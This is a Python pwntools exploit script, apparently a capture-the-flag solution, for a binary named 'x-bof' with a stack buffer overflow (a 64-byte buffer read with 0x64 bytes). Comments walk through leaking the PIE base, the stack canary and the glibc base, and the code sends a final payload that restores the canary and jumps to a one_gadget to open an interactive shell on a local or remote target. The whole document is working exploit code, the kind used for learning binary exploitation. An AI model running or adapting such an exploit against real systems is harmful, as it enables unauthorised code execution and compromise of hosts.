#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('x-bof')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


# The program is very simple, there is an infinite loop where the user can enter data that will be encrypted with a given random key using XOR. The result is printed afterwards

# To exit the program, the user must send "quit\0" encrypted with the given key.

# There is a Buffer Overflow vulnerability because `data[64]` and `read(0, data, 0x64)` (probably a typo from the developer...)

# Additional data: All protections enabled (NX, ASLR, PIE, Canary, RELRO)

# Objective: Get leaks without ROP chain (ELF, Canary, Glibc) -> Bypass ASLR, PIE and Canary -> one_gadget shell


# Helper function to send data XOR-encrypted (returns the key to decrypt later)
def send(p, data: bytes) -> int:
    p.recvuntil(b'Encrypt using key ')
    key = int(p.recvuntil(b':')[:-1].decode(), 16)
    p.sendafter(b' ', xor(data, key))
    return key


def main():
    p = get_process()

    # Debugging with GDB, we find some binary addresses in the `data` contents, so we can fill up to the values wanted so that they get printed
    key = send(p, b'A' * 40)
    p.recvuntil(b'A' * 40)

    xor_data = p.recvline().strip().ljust(8, p8(key))
    __libc_csu_init_addr = u64(xor(xor_data, key))
    log.info(f'Leaked __libc_csu_init() address: {hex(__libc_csu_init_addr)}')

    elf.address = __libc_csu_init_addr - elf.sym.__libc_csu_init
    log.success(f'PIE base address: {hex(elf.address)}')

    # Similarly, we need to overflow one byte from the canary (the null byte) and leak the remaining 7 bytes
    key = send(p, b'A' * 73)
    p.recvuntil(b'A' * 73)

    xor_data = p.recvline().strip().rjust(8, p8(key))
    canary = u64(xor(xor_data, key))
    log.success(f'Leaked canary: {hex(canary)}')

    # After the canary, we have the saved `$rbp` and the saved `$rip`. The latter is an address within Glibc (`__libc_start_main+243`), so it is useful to find the base address of Glibc
    key = send(p, b'A' * 88)
    p.recvuntil(b'A' * 88)

    xor_data = p.recvline().strip().ljust(8, p8(key))
    __libc_start_main_addr = u64(xor(xor_data, key)) - 243
    log.info(f'Leaked __libc_start_main() address: {hex(__libc_start_main_addr)}')

    glibc.address = __libc_start_main_addr - glibc.sym.__libc_start_main
    log.success(f'Glibc base address: {hex(glibc.address)}')

    # At this point, we can use a `one_gadget` shell to get a shell, because there is no space for a typical Ret2Libc ROP chain (maybe possible with a Stack Pivot, but we would need more steps). Notice the presence of `"quit\0"` to tell the program to exit the loop and return from `main`
    one_gadget = (0xe3afe, 0xe3b01, 0xe3b04)[1]

    payload  = b'quit\0' + b'A' * 67
    payload += p64(canary)
    payload += p64(0)
    payload += p64(glibc.address + one_gadget)

    send(p, payload)

    p.interactive()


if __name__ == '__main__':
    main()
